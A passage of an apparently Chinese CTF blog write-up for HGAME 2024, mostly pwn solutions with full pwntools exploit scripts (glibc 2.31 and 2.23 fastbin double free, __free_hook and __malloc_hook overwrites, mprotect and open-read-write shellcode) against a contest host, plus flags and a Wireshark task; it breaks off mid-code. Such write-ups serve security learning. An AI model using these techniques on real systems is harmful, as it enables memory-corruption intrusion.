class="hljs-string">&quot;%u&quot;</span>, &amp;id);<br>  <span class="hljs-keyword">if</span> ( id &gt; <span class="hljs-number">0xF</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    ptr = (&amp;notes)[id];<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">free</span>(ptr);<br>      ptr = <span class="hljs-number">0LL</span>;	<span class="hljs-comment">// 这里其实没有把指针清零啊 清的只是ptr (&amp;notes)[id]处还存在指针的 所以uaf</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No such note.&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><p>和上一个题差不多 但没有edit</p>
</li>
<li><blockquote>
<p>官方wp:</p>
<p>2.31的double free 这个版本的tcache中有针对double free的检查，但fastbin中没有相关检查，因此</p>
<p>可以先填满tcache，然后在fastbin中构造double free</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 2.31-9.14 cache 全绿</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">32202</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size, content</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>	io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	add(i, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;unsorted&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	delete(i)<br>delete(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>unsorted = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = unsorted - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">8</span>):<br>	add(i, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;fastbin&#x27;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;fastbin&#x27;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">8</span>):<br>	delete(i)<br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(i, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x30</span>,p64(free_hook))<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x30</span>, p64(system))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>delete(<span class="hljs-number">10</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hgame</span>&#123;<span class="hljs-number">1</span>f86c89584f2d4ebbe2a8044444b6a58dd6510ae&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>39行gdb调试可以看到，有chunk是从0x80中分割出来的 所以有一个chunk_size为0x50 所以为了填满tcache就多add一个<br>后面的多调试调整</li>
<li>还有52行以后，只剩fastbin中的chunk了 调试会发现这些chunk进入了tcache(还挺有趣)</li>
</ul>
</li>
<li><p>还看到一种方法 house_of_botcake</p>
<blockquote>
<p>libc-2.31的fastbin，存在UAF，可以用fastbin double free(2.31还未有严格的check)，不过得先把tcache塞满，但这种方法较为繁琐，使用 house of botcake是最简单的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62172019/article/details/133359490">https://blog.csdn.net/qq_62172019/article/details/133359490</a></p>
</blockquote>
</li>
</ul>
<h4 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h4><ul>
<li><p>本来还想着和之前一样打free_hook的 但是打不通</p>
<blockquote>
<p>报错：b”*** Error in &#96;.&#x2F;vuln’: malloc(): memory corruption (fast): 0x00007f25857c67b8 ***\n”</p>
<p>地址是unsortedbin的地址 具体的原因还不知道</p>
<p>官方WP写了：2.23的fastbin double free，这个版本的fastbin在malloc时会检查拿到的chunk的size是否正确，所以很难申请到任意地址的指针。但是这⾥没有对⻬检查，可以通过字节错位实现绕过。由于__free_hook 附近没有合适的值可以拿来利⽤，所以这道题⽤ __malloc_hook +one_gadget 来完成攻击。</p>
</blockquote>
</li>
<li><p>然后就对着《不同libc版本下UAF的利用手法总结》发现2.23是打malloc_hook 改成onegadget（原因不详  应该也能改成system把<br>（有的时候如果onegadget都打不通的话 就需要realloc函数来实现相应的条件限制了</p>
<blockquote>
<p>由于调⽤ <code>__malloc_hook</code> 时的的上下⽂正好都不满⾜one_gadget 的constraints，不过libc-2.23的constraints⼤部分和栈相关，同时 realloc 的开头部分有⼤量的push操作可以⽤来调整栈帧，且 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的位置是紧贴着的，可以同时被修改，所以可以先通过<code>__malloc_hook</code> 从 realloc 开头的合适位置开始执⾏，然后利⽤ __realloc_hook 调⽤ one_gadget</p>
</blockquote>
</li>
<li><p>这里是最后一个ogg打通了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># no_pie 全绿</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">31585</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size, content</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>	io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;unsorted&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>unsorted = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = unsorted - <span class="hljs-number">0x68</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>fake = unsorted - <span class="hljs-number">0x68</span> - <span class="hljs-number">0x23</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(unsorted))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>ogg = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf03a4</span>, <span class="hljs-number">0xf1247</span>]<br>onegadeet = base + ogg[<span class="hljs-number">3</span>]<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, p64(fake))<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>)+p64(onegadeet))<br><br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hgame</span><span class="hljs-template-variable">&#123;ee9422f85597939cdb57a3a74f368fbc31df5324&#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="ShellcodeMaster"><a href="#ShellcodeMaster" class="headerlink" title="ShellcodeMaster"></a>ShellcodeMaster</h4><ul>
<li>下面这个exp忘了还有沙箱，， 报错Program terminated with signal SIGSYS, Bad system call.  我说怎么不行</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./shellcodeMaster&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcodeMaster&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io.recv()<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp, 0x404500</span><br><span class="hljs-string">push 0x6873		</span><br><span class="hljs-string">mov ax, 59</span><br><span class="hljs-string">mov edi, esp</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">xor esi,esi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload = shellcode<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))	<span class="hljs-comment"># 0x16 如果没有sandbox应该能通</span><br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<ul>
<li><p>打orw就必须要read了</p>
<blockquote>
<p>出题⽬的是想让新⽣学习⼀下缩减shellcode⻓度的技巧。⽐赛中可能会遇到限制较⾼的。</p>
<p><strong>常⻅的⼿法有：置零⽤xor、寄存器⽤低位、push+pop等等。</strong></p>
<p>预期解是再实现⼀次read和mprotect，cdq指令可以控制dx</p>
</blockquote>
<p>好的 确实学习到了<br>mprotect的函数调用号应该是10   没有设置rsi是0x1000也是可以的(原来值为0x2333)  设置的还是0x1000范围是rwps</p>
<blockquote>
<p>shl edi,12：寄存器edi的值向左移动12位（相当于乘以2的12次方）（”shl”表示逻辑左移操作（Shift Left）</p>
<p>cdq：用于将32位寄存器eax中的有符号整数扩展为64位整数，将符号位拓展到edx寄存器中。具体操作如下：</p>
<ol>
<li>如果eax寄存器中的值是正数，则edx寄存器被清零。</li>
<li>如果eax寄存器中的值是负数，则edx寄存器被设置为全1（0xFFFFFFFF）。</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asm"> ► 0x233300b               syscall  &lt;SYS_mprotect&gt;<br>        addr: 0x2333000 ◂— mov dx, 7<br>        len: 0x2333<br>        prot: 0x7<br>   0x233300d               cdq    <br>   0x233300e               mov    esi, edi<br> RAX  0xa<br> RBX  0x2333<br> RCX  0x2333<br> RDX  0x7<br><br>   0x233300b               syscall <br> ► 0x233300d               cdq    <br>   0x233300e               mov    esi, edi<br>*RAX  0xfffffffffffffff4<br> RBX  0x2333<br>*RCX  0x233300d ◂— cdq  /* 0xfff31c031fe8999 */<br> RDX  0x7<br><br>   0x233300b    syscall <br>   0x233300d    cdq    <br> ► 0x233300e    mov    esi, edi<br> RAX  0xfffffffffffffff4<br> RBX  0x2333<br> RCX  0x233300d ◂— cdq  /* 0xfff31c031fe8999 */<br>*RDX  0xffffffff<br></code></pre></td></tr></table></figure>

<ul>
<li>第28行nop指令(长度是1)必须要有 个数的问题和add rsp, 0x500相配合</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./shellcodeMaster&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">31751</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcodeMaster&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>addr = <span class="hljs-number">0x404500</span><br><br>io.recv()<br>payload=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov dx, 7</span><br><span class="hljs-string">mov ax, 10</span><br><span class="hljs-string">shl edi,12</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">cdq</span><br><span class="hljs-string">mov esi, edi	</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload))) <span class="hljs-comment"># 0x16     	# read的mov要放在两个xor前面</span><br>io.send(payload)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, addr, <span class="hljs-number">0x50</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, addr, <span class="hljs-number">0x50</span>)<br>payload2 = <span class="hljs-string">b&#x27;\x90&#x27;</span>*(<span class="hljs-number">0xff</span>) + asm(<span class="hljs-string">&#x27;shl rsp, 12; add rsp, 0x500;&#x27;</span>)<br>payload2 += asm(shellcode)<br>io.sendline(payload2)<br><br><span class="hljs-comment">#basic orw shellcode  官方wp给出的手打orw</span><br><span class="hljs-comment"># shellcode_orw = asm(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># push 0x67616c66</span><br><span class="hljs-comment"># mov rdi,rsp	rsp:0x4044f8</span><br><span class="hljs-comment"># xor esi,esi</span><br><span class="hljs-comment"># push 2</span><br><span class="hljs-comment"># pop rax</span><br><span class="hljs-comment"># syscall</span><br><span class="hljs-comment"># mov rdi,rax</span><br><span class="hljs-comment"># mov rsi,rsp</span><br><span class="hljs-comment"># mov edx,0x100</span><br><span class="hljs-comment"># xor eax,eax</span><br><span class="hljs-comment"># syscall</span><br><span class="hljs-comment"># mov edi,1</span><br><span class="hljs-comment"># mov rsi,rsp</span><br><span class="hljs-comment"># push 1</span><br><span class="hljs-comment"># pop rax</span><br><span class="hljs-comment"># syscall</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><span class="hljs-comment"># io.sendline(b&#x27;\x90&#x27;*0xff+asm(&quot;shl rsp, 12; add rsp, 0x500;&quot;)+shellcode_orw)</span><br><br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">hgame&#123;<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">59947</span>fc<span class="hljs-number">9</span>fe<span class="hljs-number">2</span>da<span class="hljs-number">827468</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">14</span>a<span class="hljs-number">630822431</span>af<span class="hljs-number">9</span>e&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h4><blockquote>
<p>题目描述：An introducation to Wireshark and also ek1ng.</p>
<p><strong>提示1</strong>：尝试用Wireshark从HTTP流量中提取文件</p>
</blockquote>
<ul>
<li><p>直接根据提示搜用Wireshark从HTTP流量中提取文件</p>
<blockquote>
<p>打开wireshark –&gt; （导航栏）文件 –&gt; 打开附件<br>(导航栏)文件 –&gt; 导出文件 –&gt; http：在弹出的对话框中有ek1ng.jpg<br>保存打开是张图片 有flag</p>
</blockquote>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">hgame&#123;ek1ng_want_girlfriend_qq_<span class="hljs-number">761042182</span>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="ezword"><a href="#ezword" class="headerlink" title="ezword"></a>ezword</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://chenxi9981.github.io/hgame2024_week2/">https://chenxi9981.github.io/hgame2024_week2/</a></p>
</blockquote>
<p>盲水印得到密码（但工具没下 直接py的</p>
<figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 